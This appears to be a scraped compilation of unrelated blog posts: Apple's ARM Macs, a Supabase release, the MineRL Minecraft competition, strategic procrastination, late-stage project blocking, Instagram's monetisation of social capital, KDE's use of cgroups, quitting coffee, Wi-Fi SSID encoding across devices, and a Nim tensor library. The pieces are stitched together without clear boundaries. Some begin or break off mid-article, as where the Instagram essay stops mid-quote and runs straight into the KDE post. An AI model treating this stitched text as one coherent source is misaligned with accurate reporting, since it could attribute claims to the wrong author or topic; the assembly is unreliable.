<p>The<a href="https://9to5mac.com/2020/06/21/kuo-13-3-inch-macbook-pro-and-imac-will-be-the-first-arm-macs-to-be-released-as-soon-as-q4-after-redesigned-intel-imac-launch/"> first ARM-based Mac</a> is set to be released in Q4, 2020, or in Q1, 2021, and they are highly likely to result in a 50 to 100% increase in performance when compared to their older Intel-based counterparts. We should have an ARM-based Macbook by mid-2021.</p>
<h2>In conclusion</h2>
<p>Apple might have brought back the good ol’ days where processor speed was a thing:</p>

<p>All the same, we are all waiting to see how things will unfold.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>We're now 4 months into building <a href="https://supabase.io/">Supabase</a>, which means another major update. Here's a few things we think you'll love in this release.</p><h3>4 minute demo</h3><p>Watch a full demo:</p><h3>View relational data</h3><p>We're sometimes asked how we will make Postgres as simple as Firebase, since Postgres is a relational database. This month we're making our first steps to prove that relational databases can be even easier to use than document stores. We're releasing an excel-like editing interface which can drill down into your relational data.</p><h3>Manage JSON data</h3><p>Postgres is an amazing database, giving the flexibility of a document store with the power of a RDBMS. If you use <code>JSON</code> data in Postgres, then we want to make that easy too. Supabase detects when your column is <code>JSON</code> or <code>JSONB</code>, and provides an easy way to edit and view your data. More improvements coming soon for this feature!</p><h3>Choose your region</h3><p>If you noticed a bit of latency on Supabase, it's because your projects were previously set up in Singapore. It was always our intention that you'd be able to choose your database region, and this month we've delivered it. In the next releases we'll even allow you to go multi-region, instantly replicating your database close to your customers.</p><h3>Backups</h3><p>A guiding principle at Supabase is zero lock-in. So this month we are exposing your daily database backups on the dashboard, giving you a simple way to migrate off Supabase. We have a lot more to build in this space (<code>WAL-G!</code>), so watch this space.</p><h3>Kaizen</h3><p>We have a number of small improvements:</p><ul><li>Improved SQL editor - with better syntax highlighting</li><li>Improved API docs - with more code snippets</li><li>UX improvements - with a simplified and consistent UX</li></ul><h3>Hiring</h3><ul><li>This month we <a href="https://supabase.io/blog/2020/06/15/supabase-steve-chavez">welcome Steve Chavez to the team</a>. Steve is a maintainer of PostgREST, one of the core tools which makes Supabase possible. </li><li>We're hiring a part-time designer or UX expert. See more <a href="https://news.ycombinator.com/item?id=23708351" target="_blank" rel="noopener noreferrer">here</a>.</li></ul><h3>Get started</h3><ul><li>Start using Supabase today: <a href="https://app.supabase.io/">app.supabase.io</a></li><li>Make sure to <a href="https://github.com/supabase/supabase" target="_blank" rel="noopener noreferrer">star us on GitHub</a></li><li>Follow us <a href="https://twitter.com/supabase_io" target="_blank" rel="noopener noreferrer">on Twitter</a></li><li>Become a <a href="https://github.com/sponsors/supabase" target="_blank" rel="noopener noreferrer">sponsor</a></li></ul></section></div>]]>

<p>We are holding a competition on sample-efficient reinforcement learning using human priors. Standard methods require 
months to years of game time to attain human performance in complex games such as Go and StarCraft. In our competition,
 participants develop a system to obtain a diamond in Minecraft using only four days of training time.

<p>The MineRL competition offeres a set of Gym environments paired with human demonstrations to provide participants with
the ability to tackle the difficult Minecraft sample efficiently. This year we are introducing a new 
vectorized action and observation space that obscures the agent’s actions to prevent participants from using domain
knowlege to solve the ObtainDiamond task!</p>

<h3> The Task: Obtain Diamond in Minecraft </h3>

<p>Minecraft is a 3D, first-person, open-world game centered around the gathering of resources and creation of structures and items. These structures and items have prerequisite tools and materials required for their creation. As a result, many items require the completion of a series of natural subtasks.</p>

<p>The procedurally generated world is composed of discrete blocks that allow modification. Over the course of gameplay, players change their surroundings by gathering resources and constructing structures.</p>

<p>In this competition, the goal is to obtain a diamond. The agent begins in a random starting location without any items, and receives rewards for obtaining items which are prerequisites for diamond.</p>

<p>Most people have more to do than time to do it.</p><p>The <a href="https://en.wikipedia.org/wiki/Time_management#The_Eisenhower_Method">Eisenhower Prioritization Matrix</a> is a conceptual tool for time management that can help people decide what to work on. It’s a 2x2 matrix with urgency on one axis and importance on the other.</p><figure><img src="https://bbirnbaum.com/content/images/2020/06/eisenhower_matrix-2.png"></figure><p>Urgent and important tasks, the thinking goes, should be done right away. Non-urgent but important tasks should be scheduled. Urgent and unimportant tasks should be delegated. And non-urgent, unimportant tasks shouldn’t be done at all.</p><p>The insight behind this matrix is that people often spend too much time on urgent tasks and not enough time on important tasks. So by delegating urgent but unimportant tasks, you can free up time for important things you might not get to otherwise.</p><p>I’ve found this tool to be helpful in reminding me to focus on what’s important. But it doesn’t address another problem I have: even if I’m only working on what’s important, always starting with what’s most urgent can mean that I don’t have enough time for less urgent tasks. I’m too much of a perfectionist.</p><p>For example, when I start work in the morning, I almost always need to spend some time preparing for my meetings that day. This work is both urgent (they are happening today) and important (no one else can do it). So by the logic of the Eisenhower matrix, preparing for these meetings should be the first thing that I do.</p><p>But when I follow this reasoning, I often find myself putting too much time into the meeting prep. I might second-guess what I’m doing, spend too much time researching something tangential, or get distracted by a topic unlikely to come up in the meeting. So instead of always prioritizing what's most urgent first, I've learned to practice "strategic procrastination": purposely delaying urgent tasks to constrain the amount of time that I can spend on them.</p><p>For example, at the beginning of my morning at work, I might estimate how much time I’ll need to prepare for my meetings and then delay starting that work until I have exactly that amount of time left. Before then I’ll work on one of my other, less urgent tasks. In this way, I’m leveraging the urgency of a task to limit how much time I spend on it.</p><p>Strategic procrastination is also useful on longer time scales. When I have to prepare a presentation, for example, I often find myself wasting time on minor things, like tweaking formatting, instead of developing the core content. To avoid this I employ strategic procrastination. I delay starting work on the presentation until I have just enough time to complete it.</p><p>I sometimes adjust this method when the task requires creativity. Instead of completely delaying when I begin a task, I get started right away, but I do just enough to begin thinking about it. For a presentation, I might first spend 30 minutes writing a rough outline and then put the task aside for a few weeks. This gives me a chance to ruminate on it during downtime, and I often get ideas that I wouldn’t have gotten otherwise.</p><p>There is actually some experimental evidence behind my intuition that this approach can improve creativity. As described in <a href="https://journals.aom.org/doi/10.5465/amj.2018.1471">this paper</a> and in the book <em><a href="https://amzn.to/3dvwnjH">Originals</a></em> (which also uses the term “strategic procrastination”), students who played video games for a moderate amount of time while working on business problems came up with more creative solutions.</p><p>Strategic procrastination comes with a major risk, of course. There’s a reason that it’s usually considered good advice to not wait until the last minute to do things. If I misestimate how much time I need to perform a task, then I either need to scramble to complete it or the quality will suffer. So strategic procrastination is only a good idea when I’m confident about long it will take or if it’s not a big deal to underperform.</p><p>As long as I consider this risk, strategic procrastination has been a helpful tool to make sure I have enough time for important but non-urgent tasks. Sometimes waiting until the last minute is exactly what makes me the most productive.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>

		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="documentId">
  <div>
    
    <p><em>Date: May 6, 2018, by Mamy André-Ratsimbazafy</em></p>
<p>Arraymancer is a tensor library I’m writing from the ground up in Nim. Cuda support was added in v0.3 last December, I just released the new v0.4 with OpenCL support.</p>
<p>I’d like to share a bit of my experience on working in OpenCL through Nim. First of all, you have to know that none of the big guys (Google Tensorflow, Facebook PyTorch, Apache/Amazon MxNet, Microsoft CNTK or even Intel/AMD) has first class OpenCL support.</p>
